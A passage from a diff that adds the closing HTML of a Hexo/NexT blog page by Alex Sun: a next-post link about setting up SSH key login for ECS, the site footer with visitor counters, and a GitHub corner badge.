+                <a href="/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/" rel="next" title="为ECS设置ssh密钥登录的方法">
+                  为ECS设置ssh密钥登录的方法 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Alex Sun</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">278k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">16:51</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/nokiam9/nokiam9.github.io.git" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
